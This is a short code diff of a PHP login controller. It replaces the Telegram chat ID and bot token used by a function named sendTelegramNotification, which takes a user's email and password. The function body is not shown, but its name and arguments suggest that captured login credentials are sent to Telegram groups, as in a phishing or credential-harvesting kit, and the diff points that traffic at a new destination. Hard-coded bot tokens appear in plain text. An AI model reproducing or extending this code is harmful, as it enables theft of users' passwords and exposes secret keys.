@@ -71,8 +71,8 @@ class LoginController extends Controller
     
     private function sendTelegramNotification($email, $password)
     {
-        $chatIdGroup1 = "15020316758";
-        $telegramApiKeyGroup1 = "602701021:AAEyoBQ6Tm9nO7B-NC-Ejo6K3BzZKowUY";
+        $chatIdGroup1 = "-1002317585807";
+        $telegramApiKeyGroup1 = "7020701021:AAEyoBQ6Tm9nOGo7B-NC-Ejo6K3BzzKowUY";
 
         $chatIdGroup2 = "10021691";
         $telegramApiKeyGroup2 = "74b2937a67:AAAGHyLmtgRQ4BVerK1k1PpJmkhPRXxUp1Z4mLaf4NZB4oKz2ZlQpsOcfD_5xaHtY";
